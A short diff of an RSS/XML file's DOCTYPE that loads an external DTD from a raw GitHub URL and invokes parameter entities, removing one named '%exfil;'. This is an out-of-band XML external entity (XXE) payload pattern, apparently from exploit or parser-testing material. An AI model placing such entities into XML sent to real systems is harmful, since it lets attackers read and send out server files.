@@ -4,7 +4,6 @@
 <!ENTITY % sp SYSTEM "https://raw.githubusercontent.com/pszot/publicscripts/master/external.dtd">
 %sp;
 %param1;
-%exfil;
 ]>
 <rss version="2.0">
 <channel>
